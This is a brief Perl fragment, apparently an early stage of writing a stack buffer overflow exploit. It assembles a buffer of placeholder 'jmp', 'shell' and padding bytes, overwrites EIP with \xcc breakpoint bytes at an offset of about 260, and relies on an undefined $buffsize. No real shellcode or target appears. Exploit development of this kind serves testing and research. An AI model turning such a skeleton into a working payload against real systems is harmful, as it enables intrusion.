my $jmp = "A" x 11;
my $shell = "B" x 227;

my $nops = "C" x (260 - ((length($jmp) + length($shell))));

my $eip = "\xcc" x 4;

my $sploit = $jmp.$nops.$shell.$eip;
my $fill = "\x43" x ($buffsize - (length($sploit)));
my $buffer = $sploit.$fill;

print (length($buffer));
